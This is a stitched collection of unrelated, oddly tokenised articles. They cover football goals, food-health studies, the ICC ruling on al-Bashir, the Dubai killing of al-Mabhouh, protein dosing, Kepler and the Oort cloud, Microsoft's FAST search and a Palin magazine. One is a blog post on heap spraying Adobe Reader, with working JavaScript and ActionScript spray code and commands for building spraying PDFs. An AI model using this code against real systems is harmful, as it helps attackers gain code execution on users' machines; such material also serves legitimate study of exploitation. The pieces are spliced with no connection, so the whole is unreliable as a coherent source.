And after the goal , the product of Best 's legendary balance as much as anything else , he broke away from his awestruck team - mates to seek out the referee and , presumably , prescribe an alternative use for that whistle .
Ray Hudson , a midfielder with Fort Lauderdale , said it was " like watching Fred Astaire on a surfboard , riding a wave , with a Turkish belly dancer thrown in there . "
We have n't got a clue what this means , but it 's proof that even the opposition did n't begrudge this extraordinary goal .
This might not be as spectacular as many other solo goals , and we 're extremely confident that we 'll be slagged off for including it , but who needs to be spectacular when you can be as - near - as - damnit to perfection .
Unlike almost all individual goals – whether it be George Weah and Saeed Al - Owairan getting the bounce of the ball or Lionel Messi 's slightly heavy touch around the goalkeeper against Getafe – there is not even a hint of luck or imperfection involved here .
Romario's brain - speed is frightening : it 's as if he has paused the game before each touch , so immaculate are the choices he makes and then executes through those jerky movements that leave viewers and defenders feeling seasick .
It 's hard to think of any striker who took more pleasure out of humiliating opponents , and here he treats them with the most delicious disdain .
The dummy that leaves defender and goalkeeper sprawling pathetically at his feet is magisterial and even fools the cameraman , while the nonchalant sweep into an open net is memorably cocky .
In many ways , this is the signature Romario goal .
The team context also adds significant clout to any appreciation .
It was the culmination of a stunning European comeback : PSV , 1 - 0 down from the away leg , conceded early on in the second leg to a very good Steaua side ( Hagi , Lacatus , Petrescu , Dumitrescu , Balint ) and needed three to go through .
They got five , three from Romario , who completed his hat - trick with this goal in the dying minutes .
There is a charm all of its own surrounding the solo goal as emphatic denouement : the bit on top of the bit on top of the cherry on the icing on the cake .
In scoring a goal of such flawless genius , Romario got to have his cake and eat it .
Rosemary , chickpeas , exotic carrots , an anti-aging cocktail with a garlic base — add them to the list of powerful disease - fighting edibles , say scientists , who now include them on a roster of foods that do a body good .
Green tea , long a favorite of the health conscious , has newly realized benefits , according to new findings released Wednesday .
The mild beverage , in fact , could protect the eye against glaucoma and other eye disease , says research published in the Journal of Agricultural and Food Chemistry .
“ Scientists have confirmed that the healthful substances found in green tea — renowned for their powerful antioxidant and disease - fighting properties — do penetrate into tissues of the eye .
Their new report , the first documenting how the lens , retina , and other eye tissues absorb these substances , raises the possibility that green tea may protect against glaucoma and other common eye diseases , ” the publication said .
A team from the Department of Ophthalmology and Visual Sciences of the Chinese University of Hong Kong confirmed “ beyond a doubt ” that eye structures absorbed catechins , or antioxidants , reducing harmful “ oxidative stress ” in the eye for up to 20 hours .
“ Until now , however , nobody knew if the catechins in green tea actually passed from the stomach and gastrointestinal tract into the tissues of the eye , ” the report said .
A gourmet herb , meanwhile , is getting a health upgrade .
At the stove top or barbecue , adding rosemary to beef decreases cancer - causing agents that form during grilling , pan-frying and barbecuing , according to research from Kansas State University published in the Journal of Food Science .
Scientists went right to the frying pan and basted hamburgers with a rosemary extract to discover the substance “ significantly ” inhibited the formation of heterocyclic amines on the cooked beef — human carcinogens known to cause cancer .
Chickpeas also are on the healthy list — though not the beige variety common to salad bars .
The Volcani Center , a research site for the Israeli Ministry of Agriculture , now heralds “ colored ” chickpeas for their high protein content , plus their heavy doses of protective polyphenols and flavonoids .
Black , red , brown , green , gray and yellow chickpea varieties contain up to 13 times more antioxidants than their paler counterparts .
The small legume could “ contribute sigificantly to the management of degenerative disease , ” noted lead researcher and agronomist Shmuel Galili .
University of Wisconsin researchers had similar revelations about carrots .
Splashy new carrots from the foodie set — red , yellow , dark orange and purple — contain lycopene and lutein , the same beneficial antioxidants found in tomatoes .
These carrots can help prevent cardiovascular disease and cancer , says the report , published in Comprehensive Reviews in Food Science and Food Safety .
Scientists at McMaster University in Canada , also took a closer step to the proverbial fountain of youth by concocting , they say , a “ cocktail of ingredients that forestalls major aspects of the aging process . ”
Mice who regularly imbibed this cocktail maintained “ youthful levels ” of activity right into their old age , the researchers found , prompting them to conclude that the “ supplement extends longevity . ”
And the ingredients ? : “ items that were purchased in local stores selling vitamin and health supplements for people . ”

( CNN ) -- Judges at the International Criminal Court ruled Wednesday that Sudanese President Omar al - Bashir may be charged with genocide for his role in a five - year campaign of violence in western Sudan 's Darfur region .
Al - Bashir , who remains in office , has already been charged with war crimes and crimes against humanity .
Prosecutor Luis Moreno - Ocampo had the genocide charge on his original arrest warrant for al - Bashir , but the pre-trial judges left off the charge when they approved the warrant last March .
Moreno - Ocampo appealed in July , saying that the judges ' standard for adding the genocide charge was too high .
The appellate court agreed with Moreno - Ocampo and ruled in his favor Wednesday .
The appeals judges said the pre-trial chamber had applied an " erroneous standard of proof " to the genocide charge .
The judges said they were not ruling on whether al - Bashir should be charged with genocide -- only whether the charge could be added to the arrest warrant .
They said it will be up to the pre-trial chamber to determine whether to add the charge to the warrant , which could take several weeks .
The International Criminal Court at The Hague , Netherlands , is a permanent , treaty - based tribunal dealing with the most serious crimes against humanity .
It is an independent court that is not part of the United Nations .
It is funded primarily by nations , but also receives contributions from governments , corporations and individuals .
Even if genocide is added to the arrest warrant , Moreno - Ocampo still faces a challenge in proving the charges at trial , said Mark Ellis , the executive director of the International Bar Association .
" Genocide is a much more complicated legal position to meet ( than war crimes and crimes against humanity ) , because you have to show in proving genocide that there was a specific intent to destroy , in whole or in part , a group based on -- in this case -- ethnicity or race , " Ellis told CNN in July .
" Obviously , the prosecutor believes he would be able to prove this intent and so he wants the opportunity to prove that in trial . "
The warrant for al - Bashir was the first ever issued by the ICC for a sitting head of state .
It currently includes five counts of crimes against humanity , including murder , extermination , forcible transfer , torture and rape .
It also includes two charges of war crimes for intentionally directing attacks against civilians and for pillaging .
Al - Bashir has traveled to several countries since the warrant was issued , even though any country that is party to the ICC has an obligation to hand him over to The Hague , the court says .
He openly attended the African Union conference in Ethiopia , which ended this week .
Ethiopia is not party to the ICC .
Al - Bashir is the front - runner in an election scheduled to take place in April , and a genocide charge is unlikely to harm his prospects .
A genocide charge could further isolate Sudan , but it could also mobilize African nations around Sudan .
Leaders from several African countries have said the ICC has been unfair to Africa , and they have threatened to pull out of the court .
The United Nations estimates that 300,000 people have been killed in the conflict in Darfur , and 2.5 million have been forced from their homes .
Sudan denies that the death toll is that high .
The violence in Darfur erupted in 2003 after rebels began an uprising against the Sudanese government .
To counter the rebels , Sudanese authorities armed and cooperated with Arab militias that went from village to village in Darfur , killing , torturing and raping residents , according to the United Nations , Western governments and human rights organizations .
The militias targeted civilian members of tribes from which the rebels drew strength .
CNN 's David McKenzie contributed to this report .
It 's an indisputable fact that the two most important entertainment properties in the world are Final Fantasy and The Jersey Shore .
The former is a long - running Japanese role - playing game series published by Square - Enix .
The latter is an upstart reality show about a group of lovable ragamuffins who live in Seaside Heights , New Jersey .
After just a few episodes , those crazy Jersey Shore kids have become America 's sweethearts .
On the surface , it seems like the two have nothing in common .
The people of the Final Fantasy universe are mainly concerned with fighting evil and saving the world , while the people of The Jersey Shore spend most of their time trying to avoid puking on each other .
But after extensive research on the part of the IGN Center For Games And Television and Culture and Studies , we 've found that the two beloved series are near mirror images of one another .
Remember when that annoying kid who sat next to you in history class would never shut up about the connections between Abraham Lincoln and Marilyn Monroe ?
Well , this is far more important than that .
Who were those people , anyway ?
They certainly did n't have shows on MTV , and they do n't show up in any videogames .
Here , for the first time , we proudly present the results of a massive , minutes - long study that spanned the length of an entire section of the IGN offices .
We think you 'll find the resemblance between the Final Fantasy universe and The Jersey Shore cast nothing short of uncanny .
Below you 'll find five examples , along with images of both properties in action .
We 've let ladies and gentlemen of The Jersey Shore speak in their own words , in quotes they 've uttered on the show .
Enjoy .

After a battle , potions and herbs are sometimes needed to heal wounds .
Other times , too many potions and herbs cause these battles .

A senior Hamas official warned Western nations on Friday not to allow Israeli agents to operate from within their territories .
During a sermon in the Gaza Strip , Mahmoud Zahar warned that the Weststands to lose by helping Israel in taking the conflict abroad .
Zahar warned that Hamas would confront those nations that assist Israel .
The Hamas leader was apparently responding to certain reports accordingto which the assassination of Mahmoud al - Mabhouh in Dubai , which iswidely believed to have been carried out by the Mossad , was coordinated with other Western nations Hamas claimed Friday that two ex-officers from the rival Fatahorganization were involved in the killing of al - Mabhouh , and Fatah shotback by insinuating Hamas members were the ones who collaborated withthe killers .
The slaying of al - Mabhouh in a luxury Dubai hotel room last month hassparked bitter recriminations among the rival Palestinian factions , which have long competed for influence in the Palestinian territories .
Dubai police unveiled 11 suspects — 10 men and one woman — whoapparently traveled to Dubai on European passports with real names andauthentic data , but possibly altered photos .
Dubai also said police had two Palestinians in custody for allegedinvolvement in the murder of al - Mabhouh , whose body was found on Jan.20 .
The two were arrested in Jordan shortly after the killing , thensent back to Dubai .
A Hamas Web site , the Palestine Information Center , said those two menwere former Fatah security officers and current employees of a seniorFatah official , who was not identified .
Dubai authorities have notidentified the two Palestinians and would not comment Friday .
Hamas stopped short of accusing Fatah of collaborating with the Mossad , however .
Izzat al - Rishq , a member of Hamas 's leadership in Damascus , told The Associated Press on Friday that Hamas is " not accusing anyparty " other than Israel , though he said the agents might have used " small collaborators for logistic issues .
" The Hamas Web site identified the two men as Anwar Shheibar and AhmadHassanain .
It said they served in Fatah 's security services in Gaza , fled the territory in 2006 , and currently work for a constructioncompany owned by a high - ranking Fatah official , Mohammed Dahlan .
Dahlan denied any connection to the men or to the killing .
" I do n't have any companies in Dubai and I do n't know these people , " hetold The Associated Press by telephone from Amman , Jordan .
"
Only Hamas knew [ al - Mabhouh ] was in Dubai , so it 's their fault , notthe Palestinian Authority 's , " he said .
" For political reasons Hamas isblaming us for its own internal problems .
" A Fatah spokesman also denied the charge .
" Hamas is trying by theseaccusations to cover up the security flaws in the first lines of itsleadership , " said Adnan Damiri , a spokesman for Palestinian securityforces in the Fatah - ruled West Bank .
" Hamas is the only one to know themovement of Al - Mabhouh , and from there the information went to the Israelis .
" Officials of the Palestinian Authority in Ramallah said the two menwere former members of Fatah who later joined Hamas security forces inGaza .
They said the men were sent to Dubai on Hamas business last monthbut had no further details .
They spoke on condition of anonymitybecause they had not been given permission to comment publicly .

Introduction
A longstanding belief in fitness circles is that the body can only use a certain amount of protein per meal , and the excess is either oxidized or excreted .
The ballpark range thrown around is 20 - 30 grams , with 30 grams being perhaps the most common figure .
This guideline has led many trainees to go through the pains of consuming multiple doses of protein throughout the day , banking that it will maximize muscle anabolism or muscle retention .
Well , true or not , this concept fits in nicely with another longstanding fitness “ rule ” that you have to eat at least six times per day in order to keep the body ’s metabolism revving high .
Since the meal frequency and metabolism dogma has been thoroughly debunked [ 1 - 5 ] , it ’s time to dig into the topic of whether there ’s a limit to effective protein dosing , and if so , what that limit might be .
Looking at simple logic first
Let ’s imagine an experiment involving two relatively lean 200 lb individuals .
For the purposes of this illustration , I ’ll assign a daily amount of protein known to adequately support the needs of the athletic population .
We ’ll give Person A 150 g protein spread over five meals at 30 g each .
We ’ll give Person B the same amount of protein , but in a single meal .
Let ’s say that this meal consists of a 16 oz steak , chased with a shake containing two scoops of protein powder .
If we really believed that only 30 g protein can be handled by the body in a single meal , then Person B would eventually run into protein deficiency symptoms because he supposedly is only absorbing a total of 30 g out of the 150 g we ’re giving him .
At 30 g/ day , he ’s only getting 0.33 g/kg of bodyweight , which is n’t even half of the already - low RDA of 0.8 g/kg .
If the body worked this way , the human species would have quickly become extinct .
The human body is more efficient and effective than we give it credit for .
The body will take all the sweet time it needs to effectively digest and absorb just about whatever dose you give it .
Person
A will have shorter digestion periods per meal in order to effectively absorb and utilize the small meals .
Person B will have a longer digestion period in order to effectively absorb and utilize the large meal .
While the truth in this logic seems self - evident , the important question is whether or not it ’s supported by scientific research .
Let ’s look at the evidence , starting with immediate - effect ( acute ) studies , then move on to the longer - term trials .
Research examining speed of absorption
A thorough literature review by Bilsborough and Mann compiled data from studies by various investigators who measured the absorption rates of various protein sources [ 6 ] .
Oddly , an amino acid mixture designed to mimic the composition of pork tenderloin made the top spot , at 10 g/ hour , while whey took a close second at 8 - 10 g/ hour .
Other proteins fell in their respective spots below the top two , with little rhyme or reason behind the outcomes .
As a matter of trivia , raw egg protein was the most slowly absorbed of them all at 1.3 g/hour .
It ’s important to note that these data have some serious limitations .
A major one is the variance of the methods used to determine the absorption rates ( i.e. , intravenous infusion , oral ingestion , ileal ingestion ) .
Most of the methods are just too crude or far - fetched for serious consideration .
Another limitation is that these figures could be skewed depending upon their concentration in solution , which can affect their rate of gastric evacuation .
Another factor to consider is the timing of ingestion relative to exercise and how that might differentially affect absorption rates .
Finally , short - term data leaves a lot open to question .
Short - term research supporting the magic limit
I ’ve heard many folks parrot that the maximal anabolic effect of a single protein dose is limited to 20 grams , citing recent work by Moore and colleagues [ 7 ] .
In this study ’s 4 - hour post - exercise test period , 40 g protein did not elicit a greater anabolic response than 20 g .
I ’d interpret these outcomes with caution .
Fundamentally speaking , protein utilization can differ according to muscle mass .
The requirements of a 140 - lb person will differ markedly from someone who ’s a lean 200 .
Additionally , a relatively low amount of total volume was used ( 12 sets total ) .
Typical training bouts usually involve more than one muscle group and are commonly at least double that volume , which can potentially increase the demand for nutrient uptake .
Finally , the conclusion of the authors is questionable .
They state explicitly ,
“ …we speculate that no more than 5 - 6 times daily could one ingest this amount ( ~ 20 g ) of protein and expect muscle protein synthesis to be maximally stimulated . ”
So , they ’re implying that 100 - 120 grams of protein per day is maximal for promoting muscle growth .
Wait a minute , what ?
Based on both the bulk of the research evidence and numerous field observations , this is simply false [ 8,9 ] .
In another recent study , Symons and colleagues compared the 5 - hour response of a moderate serving of lean beef containing 30 g protein with a large serving containing 90 g protein [ 10 ] .
The smaller serving increased protein synthesis by approximately 50 % , and the larger serving caused no further increase in protein synthesis , despite being triple the dose .
The researchers concluded that the ingestion of more than 30 g protein in a single meal does not further enhance muscle protein synthesis .
While their conclusion indeed supports the outcomes of their short - term study , it ’s pretty easy to predict the outcomes in muscle size and strength if we compared a total daily protein dose of 90 g with 30 g over a longer trial period , let alone one involving a structured exercise protocol .
This brings me to the crucial point that acute outcomes merely provide grounds for hypothesis .
It ’s not completely meaningless , but it ’s far from conclusive without examining the long - term effects .
Longer - term research challenging the magic limit
If we were to believe the premise that a 20 - 30 g dose of protein yields a maximal anabolic effect , then it follows that any excess beyond this dose would be wasted .
On the contrary , the body is smarter than that .
In a 14 - day trial , Arnal and colleagues found no difference in fat - free mass or nitrogen retention between consuming 79 % of the day ’s protein needs ( roughly 54 g ) in one meal , versus the same amount spread across four meals [ 11 ] .
Notably , this study was done on young female adults whose fat - free mass averaged 40.8 kg ( 89.8 lb ) .
Considering that most non-sedentary males have considerably more lean mass than the female subjects used in the aforementioned trial , it ’s plausible that much more than 54 g protein in a single meal can be efficiently processed for anabolic and / or anti-catabolic purposes .
If we extrapolated the protein dose used in this study ( 79 % of 1.67g / kg ) to the average adult male , it would be roughly 85 - 95 g or even more , depending on just how close someone is to the end of the upper limits of muscular size .
When Arnal and colleagues applied the same protocol to the elderly population , the single - dose treatment actually caused better muscle protein retention than the multiple - dose treatment [ 12 ] .
This raises the possibility that as we age , larger protein feedings might be necessary to achieve the same effect on protein retention as lesser amounts in our youth .
IF research nailing the coffin shut ?
Perhaps the strongest case against the idea of a dosing limit beyond which anabolism or muscle retention can occur is the recent intermittent fasting ( IF ) research , particularly the trials with a control group on a conventional diet .
For example , Soeters and colleagues compared two weeks of IF involving 20 - hour fasting cycles with a conventional diet [ 13 ] .
Despite the IF group ’s consumption of an average of 101 g protein in a 4 - hour window , there was no difference in preservation of lean mass and muscle protein between groups .
In another example , Stote and colleagues actually reported an improvement in body composition ( including an increase in lean mass ) after 8 weeks in the IF group consuming one meal per day , where roughly 86 g protein was ingested in a 4 - hour window [ 14 ] .
Interestingly , the conventional group consuming three meals spread throughout the day showed no significant body composition improvements .
Keep in mind that bioelectrical impedance ( BIA ) was used to determine body composition , so these outcomes should be viewed with caution .
I ’ve been highly critical of this study in the past , and I still am .
Nevertheless , it cannot be completely written off and must be factored into the body of evidence against the idea of a magic protein dose limit .
Conclusion & application
Based on the available evidence , it ’s false to assume that the body can only use a certain amount of protein per meal .
Studies examining short - term effects have provided hints towards what might be an optimal protein dose for maximizing anabolism , but trials drawn out over longer periods have n’t supported this idea .
So , is there a limit to how much protein per meal can be effectively used ?
Yes there is , but this limit is likely similar to the amount that ’s maximally effective in an entire day .
What ’s the most protein that the body can effectively use in an entire day ?
The short answer is , a lot more than 20 - 30 g .
The long answer is , it depends on several factors .
In most cases it ’s not too far from a gram per pound in drug - free trainees , given that adequate total calories are provided [ 8,9 ] .
In terms of application , I ’ve consistently observed the effectiveness of having approximately a quarter of your target bodyweight in both the pre- and post - exercise meal .
Note : target bodyweight is a surrogate index of lean mass , and I use that to avoid making skewed calculations in cases where individuals are markedly over - or underweight .
This dose surpasses the amounts seen to cause a maximal anabolic response but does n’t impinge upon the rest of the day ’s protein allotment , which can be distributed as desired .
On days off from training , combine or split up your total protein allotment according to your personal preference and digestive tolerance .
I realize that freedom and flexibility are uncommon terms in physique culture , but maybe it ’s time for a paradigm shift .
In sum , view all information – especially gym folklore and short - term research – with caution .
Do n’t buy into the myth that protein wo n’t get used efficiently unless it ’s dosed sparingly throughout the day .
Hopefully , future research will definitively answer how different dosing schemes with various protein types affect relevant endpoints such as size and strength .
In the mean time , feel free to eat the whole steak and drink the whole shake , and if you want to get the best bang for your buck , go for a quality protein blend such as Nitrean ! 😉

CTV Olympics ( XSLT )
This is a simple bit of work that translates the XML data used by CTV's Silverlight scheduling doohickey using XSLT and presents it fairly nicely .
All times are in PST as this is what the data is in , and no time zone conversion is done .
If you do n't know how to convert time zones , now would n't be a bad time to learn .
Pro tip : EST is PST + 3 hours .

Q&A
The Kepler spacecraft 's mission is a straightforward one : keep a vigilant watch on a large patch of stars to see if they dim , even just slightly , on a regular basis .
The idea is that a planet passing in front of its host star will reveal itself to Kepler by blotting out a fraction of the star 's light .
This transit method has already borne fruit : NASA 's Kepler spotted five planets in the first few weeks after its 2009 launch , and dozens more have been detected over the past decade from the ground and from other spacecraft .
But Kepler 's strength lies in its unique sensitivity to Earth - like planets — small , terrestrial worlds in temperate orbits that allow liquid water to persist .
That same sensitivity , according to a new study , might allow Kepler to identify objects in the Oort cloud — the massive sea of comets widely believed to fill the outer reaches of the solar system but never directly observed .
Dutch astronomer Jan
Oort predicted its existence in 1950 as a way of explaining the origin of comets that come streaking into the inner solar system from afar .
A few known distant objects have been hypothesized to belong to the innermost fringe of the cloud , but their true provenance remains unknown .
In the March 1 Astrophysical Journal Letters , astrophysicists Eran Ofek of the California Institute of Technology and Ehud Nakar of Tel Aviv University estimate that Kepler could observe as many as 100 eclipses of its target stars by Oort cloud objects during its 3.5 - year exoplanet - hunting mission .
If Kepler detects enough eclipses , Ofek and Nakar propose , the data could be used to place observational constraints on the location and size distribution of the Oort cloud .
This effort would not be the first time that a space telescope has been used to look for distant solar system objects in this way .
In December Ofek and his colleagues reported finding in archived Hubble Space Telescope data an eclipse caused by an object in the nearer Kuiper belt , the icy debris field where Pluto resides .
And a 2004 paper proposed that Kepler might be able to spot Kuiper belt objects , although Ofek says that his and Nakar 's calculations indicate that will not happen .
The spacecraft 's line of sight , angled high above the orbital plane of the solar system 's planets , makes it more likely to detect objects in the spherical Oort cloud than in the more planar Kuiper belt .
Matthew Lehner , an astronomer with the Institute of Astronomy and Astrophysics at Academia Sinica in Taipei , Taiwan , says he finds the proposal to be plausible , even though Kepler 's exposures are much longer than the duration of an eclipse .
As such , each eclipse would show up as a dip in starlight in only one reading , whereas an exoplanet 's passage would be spread out across several readings .
" The events are short relative to the exposure time , " Lehner says , " but Kepler also has a very high photometric [ light intensity ] accuracy , so it should be sensitive to at least some of the events . "
Kepler would have to detect several candidate events in order for astronomers to confidently correlate them with eclipses by Oort cloud objects rather than with , say , detector glitches .
Ofek and Nakar propose authenticity tests that would favor viable eclipses over random noise , such as checking to see if the eclipses tend to occur on stars that appear smaller from Kepler 's viewpoint or if the eclipse rate is dependent on the spacecraft 's motion .
Ofek acknowledges that firmly identifying Oort cloud comets will require a high yield of eclipses from Kepler , something that is hardly guaranteed , given how little is known of the cloud 's makeup .
Based on various estimates of the Oort cloud 's properties , Ofek and Nakar calculate that Kepler may spot anywhere from zero to 100 eclipses in its mission .
" The big ' if ' here is that to implement this you need to detect many events , " Ofek says .
He notes that , roughly speaking , an event count in the tens would allow astronomers to say something about the Oort objects Kepler has seen .
" If the estimates of the contents of the Oort cloud are correct , there is a good chance that we will detect more than 10 events , " Ofek says .
" If you do n't detect anything , you still have the strongest constraint yet on the contents of the Oort cloud . "
Filling Adobe ’s heap … February 15 , 2010
This post is about how to fill the Adobe Readers Heap .
We ’ll summarize and put in practice 3 ways of filling Adobe Reader memory .
The idea is that when Adobe finnish parsing our PDF we could be pretty sure that at some fixed address there will be controled data .
We ’re not going to do any fancy feng - shui or heap massage , the idea of this is just to show 3 practical known ways for filling the Reader process memory .
Can we fill it ?
” ’ In heap spraying is a technique used in ” ’ In computer security is a technique used in exploits to facilitate arbitrary code execution .
In general , code that sprays the heap attempts to put a certain sequence of bytes at a predetermined location in the memory of a target process by having it allocate ( large ) blocks on the process ’ heap and fill the bytes in these blocks with the right values .
They commonly take advantage from the fact that these heap blocks will roughly be in the same location every time the heap spray is run . ” ’
The basic idea is to make the target process allocate BIG chunks of memory forcing the underlying memory allocator to align those at some 0x1000 border .
There is ASLR and you ca n’t predict where a freshly allocated chunk of memory is going to be .
But if the amount of asked memory is big enough , when allocated , it will be aligned at some 0x1000 border in most OSs .
An allocation size of 0x100000 bytes works in XP and linux2.6.32 ( 32bits ) .
Probably this will continue to be this way for a long time due to memory usage performance reasons .
Think embedded !
Objective :
Have some degree of certainty about what ’s on a fixed memory address .
Needs :
a) Big allocations should be aligned to some 0x1000 byte border .
b) Being able to do a lot of big allocations programatically .
c ) Controlling what ’s inside our big allocations .
Wikipedia says that there are 3 ways of implementing a heap spray : Javascript , ActionScript , and Images .
So we ’ll honor those 3 :
The JS way
This is the most popular and most used way to play with memory allocations programatically .
There are a lot of research and practical examples about this .
I personally have started from here .
We are targeting PDFs so it has one BIG drawback : you need to have Javascript interpreter on the target process .
Interestingly Adobe Reader supports JS heap spraying .
The following JS code will construct a 0x100000 bytes long memory chunk made out of the concatenation of several % % minichunk % % .
And then copy 300 times those 0x100000 bytes long chunk to 300 different newly allocated memory .
var slide_size=0x100000 ; var size = 300 ; var x = new Array ( size ) ; var chunk = % % minichunk % % ; while ( chunk.length <= slide_size / 2 ) chunk += chunk ; for ( i=0 ; i < size ; i+=1 ) { id = " " +i ; x[ i ] = chunk.substring(4,slide_size/2-id.length-20)+id ; }
That % % minichunk % % is a place holder that is going to be filled by the python that will generate the PDF file .
If we made that % % minichunk % % of exactly 0x1000 bytes of controled data , any 0x1000 aligned byte inside the big chunk will have the first byte of the minichunk .
Now as we ’ll put 300 times the big chunk we could speculate where the OS will put at least one of those .
Ok let ’s try it !
we ’ll modify a little bit the python from here so it contains the spraying JS .
The new python file looks like this .
Let ’s create the pdf :
python JSSpray.py > JSSpray.pdf
and try it with Adobe Reader :
acroread JSSpray.pdf
Its running !
Now get its PID and check its memory footprint :
ps - eo pid, vsz , cmd - ww -- sort=pid |grep acroread 8197 426104 K /opt/Adobe/.../bin/acroread JSSpray.pdf
OK 400 Megabytes !
It seems to be working !
Let ’s check out its memory mappings …

a198a000 - b3b8a000 is probably the key .
Let ’s take a look with the debugger …
gdb GNU gdb ( Gentoo 7.0 p1 ) 7.0 Copyright ( C ) 2009 Free Software Foundation , Inc.

It worked !
We got the same values from memory 0x1000 aligned .
We just need to hope some of our 300 Megabytes were put in the 0xb0000000 address .
The JS spraying PDF version is here .
The ActionScript way
For the actual Actionscript part of this we ’ll pick up from here .
And for the PDF part we ’ll take the SWF into PDF tool from this post .
OK , the the following Haxe code will allocate a configurable number of times some 0x100000 bytes long memory chunks composed from the concatenation of the passed minichunks .
It expects as a parameter the content of the minichunk and the number of times it should replicate the ‘ big ’ 0x100000 bytes long chunk .
For more info about AS sprays check this and that .
class MySpray { static var Memory = new Array ( ) ; static var chunk_size = 0x100000 ; static var chunk_num ; static var minichunk ; static var t ; static function main ( ) { minichunk = flash .
Lib.current.loaderInfo.parameters.minichunk ; chunk_num = Std.parseInt(flash.Lib.current.loaderInfo.parameters.N ) ; t = new haxe .
Timer ( 7 ) ; t.run = doSpray ; } static function doSpray ( ) { var chunk = new flash.utils .
ByteArray ( ) ; while ( chunk.length < chunk_size ) { chunk.writeMultiByte(minichunk , ' us - ascii ' ) ; } for( i in 0 ... chunk_num ) { Memory.push ( chunk ) ; } chunk_num -- ; if ( chunk_num == 0 ) { t.stop ( ) ; } } }
Of course , it needs haxe to compile .
And it compiles to Flash 9 issuing this command :
haxe - main MySpray - swf9 MySpray.swf
Once you have the swf file you may insert it into a pdf file using this py from this post .
python SWFSpray.py MySpray.swf " N=300 &minichunk= <<<>>> " > SWFSpray.pdf
OK , Let ’s run Adobe Reader :
acroread JSSpray.pdf
… get its PID and check its memory footprint :
ps - eo pid, vsz , cmd - ww -- sort=pid |grep acroread 8234 568144 K /opt/Adobe/.../bin/acroread
SWFSpray.pdf
OK 500 Megabytes !

Let ’s see what ’s inside 9f114000 - a0314000 with the debugger …

It also worked !
It feels a little slow though .
The Image way
As both the PDF specification and the Adobe implementation have been so bloated there are probably a lot of different ways to acomplish this .
Our approach is to use as less PDF objects as posible .
For this we ’ll fill the memory using embeded images .
There is a way explained in PDF32000 8.9.7 Inline Images for inlining image data into the page contents .
As an alternative to the image XObjects described in 8.9.5 , “ Image Dictionaries ” , a sampled image may be specified in the form of an inline image .
This type of image shall be defined directly within the content stream in which it will be painted instead of being defined as a separate object .
Because the inline format gives the reader less flexibility in managing the image data , it shall only be used for small images ( 4 KB or less ) .
Basically a PDF inline image goes inside the content stream of a page and has this look :
BI
… Key-value pairs …
ID
… Image data …
EI
where …
BI Begins an inline image object .
ID Begins the image data for an inline image object .
EI Ends an inline image object .
And here it is an example in the form of a python string …
“ BI / W 10 /H 1 / CS /G / BPC 8 ID AAAAAAAAEI ”
… which represents a grayscale 10 pixels image of the color represented by “ A ” .
No so big for our purpose but you got the idea .
Also the 4 k restriction / recomendation pointed out in the documentation is not enforced by Adobe ’s implementation , so we can go really big .
Also the page contents are PDF streams and could be compacted and filtered with any number of pdf filters , meaning … small PDF file size .
So here you have the py for generating a memory filling PDF using nothing but inline images .
Create the pdf :
python PDFSpray.py > PDFSpray.pdf
Run Adobe Reader :
acroread PDFSpray.pdf
… get it ’s PID and check its memory footprint :
ps - eo pid, vsz , cmd - ww -- sort=pid |grep acroread 8805 532984 K /opt/Adobe/.../bin/acroread
PDFSpray.pdf
OK 500 Megabytes !
It seems to be working !
Let ’s check out its memory mappings …

Conclusion :
Yes we can fill it !
There probably are and will be 1000000 ways to fill a browser memory , so it may be a good idea to stop trying to detect the source of the spray and instead , try detecting the spray itself .
Also bear in mind that the actual spray may not contain code all the time , it may contain just pointers to do some ret2libc oriented programming .

HONG KONG 
As most countries agonize over how to keep their barely reviving economies growing , China is already looking to slam on the brakes .
China ’s central bank moved late Friday to reduce lending to companies and individuals by requiring large commercial banks to increase the amount of cash they park with the central bank .
The move , which came earlier than most economists had expected , was meant to slow China ’s breakneck economy and inflation .
It was the second time in a month that the central bank had directed the country ’s banks to increase reserves .
In spite of the earlier edict , which took effect on Jan. 18 , banks actually lent more money in January than in the previous three months combined , illustrating just how hard it is for Beijing to modulate its rapidly expanding economy .
Chinese economists now predict the economy will grow about 10 percent this year , while Western economists put the figure closer to 12 percent .
The growth reflects a revival of exports , strong consumer spending and heavy government investment in infrastructure projects like high - speed rail lines .
Customers of FAST 's Enterprise Search Platform ( ESP ) on Linux or Unix better develop a taste for Windows or look elsewhere for their enterprise search .
Microsoft - which bought FAST in 2008 - has announced it will stop development of FAST 's ESP core on Linux and Unix after the release of Office 2010 and SharePoint 2010 later this year .
FAST is being integrated with Office and SharePoint , and Microsoft will build its FAST core search engine only for Windows .
It 's a bold move .
Microsoft paid $ 1.2bn for FAST and has decided it 's better to double down on the Windows install base and gamble it can bring over those on Linux or Unix .
Given Microsoft 's history of its products on Windows , it was only a matter of time before the change came .
It 's a decision , though , that could give those customers already running ESP on Linux and Unix incentive to stick with open - source by adopting Apache Software Foundation 's Lucene and Solr .
That left FAST chief technology officer Bjørn Olstad , a Microsoft distinguished engineer , to explain the move .
He said that by only focusing on Windows , the company can deliver more innovation per release in the future .
FAST entered the search business in 1997 .
Olstad announced an upgrade program to move customers to a hosted search service or FAST on Windows .
He also said Microsoft is " investing in interoperability " between Windows and other operating systems to help ease the transition .
Microsoft will support ESP 5.3 throughout its product lifecycle of five years mainstream support and five years extended support .
Extended support for ESP 5.3 will end on July 16 , 2018
" We 're committed to working with you through the transition and look forward to partnering with you for success now and in the future , " Olstad said .
He noted FAST on Windows would continue to search for data held on Linux and Unix systems while its UI controls would work with UI frameworks running on any operating system .
" Many of our customers run FAST ESP on Linux and UNIX today , and we recognize that our future focus on Windows means change . , " Olstad wrote .
" To ease the transition , we 're investing in interoperability between Windows and other operating systems , reaffirming our commitment to 10 years of support for our non-Windows products , and taking concrete steps to help customers plan for the future . " ®
Which fact is more befuddling : ( 1. ) Though Sarah Palin : The Untold Story ... In Her Own Words ! is written in the first person , it was made with zero input from Palin . ( 2 . ) This magazine is expected to make money .
Since the former governor of Alaska is a demure wallflower who rarely speaks for herself , one of those companies that does Michael Jackson commemorations and glossy paeans to the stars of Twilight has created the Tiger Beat to Going Rogue 's War and Peace .
Sarah Palin : The Untold Story has a print run " in the hundreds of thousands " and is apparently selling well .
Even as the rest of media falls to pieces , memorabilia magazines apparently continue to turn profits .
Washington
Post blog 44 reports :
" The genesis of it was really simple , " said Steve LeGrice , the publisher and editor of Imagine That .
" We 're up here in New York , and there was clearly this huge enthusiasm for Sarah Palin , and at the same time all the people in the media world were sitting around scratching their heads " about how people could support her .
